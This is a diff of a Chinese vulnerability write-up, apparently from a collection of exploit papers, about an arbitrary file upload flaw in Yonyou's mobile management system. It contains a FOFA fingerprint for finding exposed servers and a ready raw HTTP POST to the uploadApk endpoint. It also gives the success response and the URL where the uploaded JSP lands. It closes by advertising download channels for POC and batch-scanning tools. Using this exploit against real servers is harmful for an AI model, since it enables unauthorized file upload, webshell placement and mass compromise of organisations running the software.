@@ -3,7 +3,7 @@ fofa: "查询语句"
 source: "MrWQ/vulnerability-paper"
 ---
 
-# ​用友移动管理系统存在任意文件上传漏洞 附 POC
+# 用友移动管理系统存在任意文件上传漏洞 附 POC
 
 <meta name="referrer" content="no-referrer"/>
 > 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/NPZ0IU4aZgCjpwpo6licdQ)
@@ -33,7 +33,7 @@ CNVD 编号:
 3. 影响版本
 -------
 
-用友移动系统管理旧版本 
+用友移动系统管理旧版本 
 
 ![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3ZibgDjnmNedosSl7icIzFXeUFPnmrchcPr8s2W0LvyJhyKCgdFXibhxnuic26cf3FaTyyMIVNV051avw/640?wx_fmt=jpeg)
 
@@ -50,18 +50,18 @@ body="../js/jslib/jquery.blockUI.js"
 漏洞数据包：
 
 ```
-POST /maportal/appmanager/uploadApk.dopk_obj= HTTP/1.1
-Host: 127.0.0.1
-User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
-Accept-Encoding: gzip, deflate
-Accept: */*
-Connection: close
-Content-Type: application/x-www-form-urlencoded
-Content-Length: 196
+POST /maportal/appmanager/uploadApk.dopk_obj= HTTP/1.1
+Host: 127.0.0.1
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 196
 
 --fa48ebfef59b133a8cd5275661b35d2c
-Content-Disposition: form-data; 
-Content-Type: application/msword
+Content-Disposition: form-data; 
+Content-Type: application/msword
 
 082863327
 --fa48ebfef59b133a8cd5275661b35d2c--
@@ -70,7 +70,7 @@ Content-Type: application/msword
 
 ```
 
-如果返回字符 {"status":2} 证明上传成功 
+如果返回字符 {"status":2} 证明上传成功 
 
 ![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3ZibgDjnmNedosSl7icIzFXeUoCMBopmVILXeV7Sg5OyuhxG6qZfgwHw63fMqvqgyGlRgeLiaNAexdcg/640?wx_fmt=jpeg)
 
@@ -83,11 +83,11 @@ http://127.0.0.1/maupload/apk/59209.jsp
 6.POC&EXP
 ---------
 
-关注公众号  南风漏洞复现文库 并回复  漏洞复现 56  即可获得该 POC 工具下载地址： 
+关注公众号  南风漏洞复现文库 并回复  漏洞复现 56  即可获得该 POC 工具下载地址： 
 
 ![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3ZibgDjnmNedosSl7icIzFXeUAt9L6sWCuD8QPJLgLhlyKk90icKZhXqSbp3yPcBcc1VWTTJHS7CfaJA/640?wx_fmt=jpeg)
 
-本期漏洞及往期漏洞的 nuclei 批量扫描脚本已经上传知识星球：南风网络安全 
+本期漏洞及往期漏洞的 nuclei 批量扫描脚本已经上传知识星球：南风网络安全 
 
 ![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3ZibgDjnmNedosSl7icIzFXeUPFbD0Vt8PR7fLRkdRKqdNRhKSUYBHMQD3VmGhlmlzew9icVLktdWzvA/640?wx_fmt=jpeg)
 
